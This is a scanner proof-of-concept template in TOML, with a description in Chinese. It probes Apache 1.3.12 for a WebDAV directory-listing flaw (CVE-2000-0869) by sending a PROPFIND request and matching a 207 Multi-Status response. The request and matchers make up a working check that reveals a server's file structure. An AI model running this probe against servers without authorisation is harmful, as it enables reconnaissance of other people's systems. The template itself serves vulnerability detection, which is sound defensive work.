[info]
author = "AVE"
description = "向 Apache 1.3.12 服务器根目录发送 PROPFIND HTTP 请求，检测 WebDAV 目录列举漏洞。若服务器返回 207 Multi-Status 状态码且响应体包含 DAV XML 命名空间，说明 WebDAV 已启用且存在目录遍历风险。攻击者可能利用此漏洞获取服务器文件结构信息。"
id = "POC-AVE-2000-0639"
name = "Apache HTTP Server 1.3.12 WebDAV Directory Listing PoC"
severity = "medium"
tags = [
    "cve-2000-0869",
    "webdav",
    "apache",
    "directory-listing",
]
vuln_id = [
    "CVE-2000-0869",
    "AVE-2000-0639",
]

[poc]
logic = "all"

[[poc.requests]]
method = "PROPFIND"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = """
<?xml version="1.0"?>
<D:propfind xmlns:D="DAV:">
<D:prop>
<D:displayname/>
<D:resourcetype/>
</D:prop>
</D:propfind>"""
type = "raw"

[poc.requests.headers]
Content-Type = "application/xml"
Depth = "1"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [207]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "D:multistatus",
    'xmlns:D="DAV:"',
]
